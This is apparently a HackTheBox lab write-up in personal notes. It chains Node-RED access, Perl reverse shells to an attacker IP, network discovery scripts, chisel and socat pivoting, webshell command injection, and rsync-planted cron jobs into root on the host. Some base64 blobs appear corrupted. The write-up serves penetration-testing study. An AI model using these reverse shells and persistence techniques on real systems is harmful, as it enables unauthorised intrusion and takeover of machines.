HackTheBox
![[Pasted image 20240403191812.png]]

Trying dictionary attack
`nmap --script http-enum 10.10.10.94`
Based on the symbol, we can infer that we are working in a service with no result.

Access to the site site that it doesn't work using GET

![[Pasted image 20240406081431.png]]
Trying with POST
 `curl -s -X POST "http://10.10.10.94:1880" | jq` *using jq to show it better as json format*
We now have a response:

![[Pasted image 20240406081732.png]]

Trying using the ID and the path discovered:

![[Pasted image 20240406115051.png]]

We have access to Node-RED
![[Abusing Node-RED]]

As the system has perl, we can create an interactive shell by using a reverse shell with it:

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

`perl -e 'use Socket;$i="10.10.14.70";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

Copying to the clipboard removing the endliner at the end (prevents to press enter when copied)
`cat data | tr -d '\n' | xclip -sel clip` 

![[Pasted image 20240406121428.png]]

It brings a better shell and we can use commands to make an interactive shell.
Finding files with word *config*
`find \-name *config* 2>/dev/null`

# Discovering network hosts
````
#!/bin/bash

function ctrl_c(){
	echo -e "\n\n[!] Quitting..\n"
	tput cnorm; exit 1
}

 #Ctrl+C
trap ctrl_c INT

networks=(172.18.0 172.19.0)
tput civis; for network in ${networks[@]};do
	echo -e "\n[+] Enumerating network: $network.0/24"
	for i in $(seq 1 254); do
		timeout 1 bash -c "ping -c 1 $network.$i" &>/dev/null && echo -e "[+] Host $network.$i - ACTIVE" &
	done; wait
done; tput cnorm
````

### Transferring the file
Creating a file *HostDiscover.sh* and changing the format to base64 to transfer:

`base64 -w 0 HostDiscovery.sh | xclip -sel clip`
- -w 0 to put all the result in one line
In the victime:
````
echo IyEvYmluL2Jhc2gKCmZ1bmN0aW9uIGN0cmxfYygpewogIGVjaG8gLWUgIlxuXG5bIV0gUXVpdHRpbmcuLlxuIgogIHRwdXQgY25vcm07IGV4aXQgMQp9CgogI0N0cmwrQwp0cmFwIGN0cmxfYyBJTlQKCm5ldHdvcmtzPSgxNzIuMTguMCAxNzIuMTkuMCkKdHB1dCBjaXZpczsgZm9yIG5ldHdvcmsgaW4gJHtuZXR3b3Jrc1tAXX07ZG8KICBlY2hvIC1lICJcblsrXSBFbnVtZXJhdGluZyBuZXR3b3JrOiAkbmV0d29yay4wLzI0IgogIGZvciBpIGluICQoc2VxIDEgMjU0KTsgZG8KICAgICAgdGltZW91dCAxIGJhc2ggLWMgInBpbmcgLWMgMSAkbmV0d29yay4kaSIgJj4vZGV2L251bGwgJiYgZWNobyAtZSAiWytdIEhvc3QgJG5ldHdvcmsuJGkgLSBBQ1RJVkUiICYKICBkb25lOyB3YWl0CmRvbmU7IHRwdXQgY25vcm0K | base64 -d > HostDiscovery.sh
````

![[Pasted image 20240406125409.png]]

We found new netwoks

### Port Discovery

````
#!/bin/bash

function ctrl_c(){
	echo -e "\n\n[!] Quitting..\n"
	tput cnorm; exit 1
}

 #Ctrl+C
trap ctrl_c INT

hosts=(172.18.0.1 172.18.0.2 172.19.0.1 172.19.0.2 172.19.0.3 172.19.0.4)
tput civis; for host in ${hosts[@]};do
	echo -e "\n[+] Enumerating ports for $host:"
	for port in $(seq 1 10000); do
		timeout 1 bash -c "echo '' > /dev/tcp/$host/$port" 2>/dev/null && echo -e "\t[+] Port $port - OPEN" &
	done; wait
done; tput cnorm
````

````
echo IyEvYmluL2Jhc2gKCmZ1bmN0aW9uIGN0cmxfYygpewogIGVjaG8gLWUgIlxuXG5bIV0gUXVpdHRpbmcuLlxuIgogIHRwdXQgY25vcm07IGV4aXQgMQp9CgogI0N0cmwrQwp0cmFwIGN0cmxfYyBJTlQKCmhvc3RzPSgxNzIuMTguMC4xIDE3Mi4xOC4wLjIgMTcyLjE5LjAuMSAxNzIuMTkuMC4yIDE3Mi4xOS4wLjMgMTcyLjE5LjAuNCkKdHB1dCBjaXZpczsgZm9yIGhvc3QgaW4gJHtob3N0c1tAXX07ZG8KICBlY2hvIC1lICJcblsrXSBFbnVtZXJhdGluZyBwb3J0cyBmb3IgJGhvc3Q6IgogIGZvciBwb3J0IGluICQoc2VxIDEgMTAwMDApOyBkbwogICAgdGltZW91dCAxIGJhc2ggLWMgImVjaG8gJycgPiAvZGV2L3RjcC8kaG9zdC8kcG9ydCIgMj4vZGV2L251bGwgJiYgZWNobyAtZSAiXHRbK10gUG9ydCAkcG9ydCAtIE9QRU4iICYKICBkb25lOyB3YWl0CmRvbmU7IHRwdXQgY25vcm0K | base64 -d > PortDiscovery.sh
````

![[Pasted image 20240406135104.png]]
After reboot the machine
![[Pasted image 20240406182121.png]]
# PortForwarding

After downloaded chisel, we transfer it  to the victime machine which doesn't have *curl* either *wget*.
We can use then the **curl** function in bash

#### curl() function without curl command bash
````
function __curl() {
  read -r proto server path <<<"$(printf '%s' "${1//// }")"
  if [ "$proto" != "http:" ]; then
    printf >&2 "sorry, %s supports only http\n" "${FUNCNAME[0]}"
    return 1
  fi
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [ "${HOST}" = "${PORT}" ] && PORT=80

  exec 3<>"/dev/tcp/${HOST}/$PORT"
  printf 'GET %s HTTP/1.0\r\nHost: %s\r\n\r\n' "${DOC}" "${HOST}" >&3
  (while read -r line; do
   [ "$line" = $'\r' ] && break
  done && cat) <&3
  exec 3>&-
  }
  ````

![[Pasted image 20240406142223.png]] 
### Creating a tunnel to web container

In victime side:
`./chisel client 10.10.14.70:1234 R:80:172.19.0.4:80`

![[Pasted image 20240406143336.png]]
Now we can see the content of web host 172.19.0.4
![[Pasted image 20240406143442.png]]

Analyzing the source code, we find possible storage file where we don't have access to


![[Pasted image 20240406170402.png]]
![[Pasted image 20240406170433.png]]
Path that stored ajax.php
>url: "8924d0549008565c554f8128cd11fda4/ajax.php?test=get hits"
### Creating a tunnel to Redis service

By adding to the existing tunnel:
`./chisel client 10.10.14.70:1234 R:80:172.19.0.3:80 R:6379:172.19.0.2:6379`
![[Pasted image 20240406162139.png]]

We can use our host specifying that port which by the tunnel will be the container port:
`nmap -sCV -p6379 -T5 127.0.0.1`
![[Pasted image 20240406162332.png]]

# Redis-cli exploitation
![[Redis-cli exploitation]]![[Pasted image 20240406170609.png]]

### Trying connectivity to our machine
`http://127.0.0.1/8924d0549008565c554f8128cd11fda4/cmd.php?cmd=ping -c 1 10.10.14.70 2>%261`

![[Pasted image 20240406171439.png]]

Operation not permited for ping, we can try using socat to reddirect the traffic to a machine in the same segment as *www* server

### Socat redirection from www to node-red machine
[[Pivoting]]
#### Loading socat to node-red machine
https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat

By using the function __ *curl* we already defined: we transfer *socat* to node-red server .

As *www* has shell, we can use a reverse shell to be sent first to *node-red* and after to our machine

If we send the reverse shell to port 1111 to *node-red* (to which *www* has access), the trafic will be redirect to us to the port 2222, so we need to wait for it listening

`./socat TCP-LISTEN:1112,fork TCP:10.10.14.70:2222 &`

We can start chisel as well after that if this was stop to create the tunnels.

### Sending a reverse shell
By using perl revershell:

`perl -e 'use Socket;$i="172.18.0.2";$p=1112;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

URL payload:
Important to replace *&* for url encode *%26* before sending
`http://127.0.0.1/8924d0549008565c554f8128cd11fda4/cmd.php?cmd=perl -e 'use Socket;$i="172.19.0.4";$p=1112;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">%26S");open(STDOUT,">%26S");open(STDERR,">%26S");exec("/bin/sh -i");};'`
![[Pasted image 20240406183444.png]]

Now we are in *www* server

Finding the flag but the is not available for www-data user:
`find \-name user.txt 2>/dev/null`

Users found:
![[Pasted image 20240406184030.png]]

We found a segment 20 
![[Pasted image 20240406183730.png]]

# Privilege Escalation on www server

### Finding commands that are beeing executed 
[[Comparing scheduled proccesses]]

As *www* machine doesn't has vim or nano, we create the script in our machine and then we upload it.
````
#!/bin/bash
old_process = $(ps -eo command)

while true; do
	new_process=$(ps -eo command)
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "command|procmon|kworker"
	old_process=$new_process
done
````

In *www* machine:
````
echo IyEvYmluL2Jhc2gKb2xkX3Byb2Nlc3MgPSAkKHBzIC1lbyBjb21tYW5kKQoKd2hpbGUgdHJ1ZTsgZG8KICBuZXdfcHJvY2Vzcz0kKHBzIC1lbyBjb21tYW5kKQogIGRpZmYgPChlY2hvICIkGVjaG8gIiRuZXdfcHJvY2VzcyIpIHwgZ3JlcCAiW1w+XDxdIiB8IGdyZXAgLXZFICJjb21tYW5kfHByb2Ntb258a3dvcmtlciIKICBvbGRfcHJvY2Vzcz0kbmV3X3Byb2Nlc3MKZG9uZQo= | base64 -d > procmon.sh
````

To be sure the file was not corrupted, we can compare the checksum:
`md5sum procmon.sh`

### Results
We found services related to a server *backup* by port 873
![[Pasted image 20240406190303.png]]
## Abusing Rsync 
![[Rsync Wildcards Spare]]

# Enumerating backup server

There is a new segment
![[Pasted image 20240406201745.png]]

Discovering *backup* server: 172.20.0.2
![[Pasted image 20240406202118.png]]

## Injecting Cron task by Rsync  

In directory `rsync://172.20.0.2/src` there is many directory from *backup* server that we have access to
![[Pasted image 20240406205127.png]]
For example, it's possible to get /etc/passwd
`rsync rsync://172.20.0.2/src/etc/passwd passwd` *file stored as passwd*
![[Cron abuse by cron.d]]

Injecting the payload by *rsync* from *www* machine to *backup*

`rsync reverse rsync://172.20.0.2/src/etc/cron.d/reverse`

![[Pasted image 20240406211019.png]]

### Defining file reverse
In order to create a reverse shell, we can directy upload *socat* file to www container (which has directly acess to *backup* server) insted of using chisel tunnels and socket to get our attacker machine.
#### Loading socat
Configuring __ *curl* in *www* container,  we can use socat and chisel tunnel (port 1112 to our machine  2222 already set) to transfer the file by a http server

**We will use only socat to listen to a port like a netcat**

Attacker:
`python3 -m http.server 2222`

www container:
`__curl  http://172.19.0.4:1112/socat > socat`

# Reverse shell in backup container

We use the perl payload to create *reverse.sh* file that will be called by our malicious *cron* by using port 5555 
````
perl -e 'use Socket;$i="172.20.0.3";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
````

````
echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTcyLjIwLjAuMyI7JHA9NTU1NTtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsnCg== | base64 -d > reverse.sh
````

#### Loading reverse.sh to backup container
`rsync reverse.sh rsync://172.20.0.2/src/tmp/reverse.sh`

Verifying if this was loaded:
`rsync rsync://172.20.0.2/src/tmp/reverse.sh`
![[Pasted image 20240407070904.png]]

Now we wait using *socat* listening in port 5555
`./socat TCP-LISTEN:5555 stdout`
![[Pasted image 20240407071129.png]]
We can generate even an Interactive shell and it's possible to perform in on *www* sever

# Scaling to main machine

## Analyzing mounted files
`df -h`
We found a file system mounted as /baskup in the machine
![[Pasted image 20240407071756.png]]

Comparint to *www* container, /dev/sda2 was mounted to home so it's suspicious that in this case is on */backup*. (Generally this filesystem is in home)

![[Pasted image 20240407072831.png]]

![[Pasted image 20240407072914.png]]

### Mounting it to inspect

`mkdir /mnt/test`
`mount /dev/sda2 /mnt/test`
`cd /mnt/test`
and we find a different filesystem that the container (the main machine)
![[Pasted image 20240407073438.png]]
## Getting a shell in main machine by using cron

As we have access to the file system of the *main machine*, we can create other malicious *cron* as seen before to get access to *backup* machine

from /mnt/etc: `cd ./etc/cron.d`
![[Pasted image 20240407074111.png]]
#### Creating malicious cron
`echo '* * * * * root sh /tmp/reverse_perl.sh' > task`
![[Pasted image 20240407074507.png]]
Loading *reverse_perl.sh* into directoy */tmp* of *main machine*

As we know that main machine has access directly to our machine, we create the  payload in in */mnt/test/tmp*

````
perl -e 'use Socket;$i="10.10.14.70";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
````

````
echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTAuMTAuMTQuNzAiOyRwPTc3Nzc7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307Jwo= | base64 -d > reverse_perl.sh
````

Granting execution permissions `chmod +x reverse_perl.sh`, we listen in our machine to port 7777 and we will get the shell

![[Pasted image 20240407074909.png]]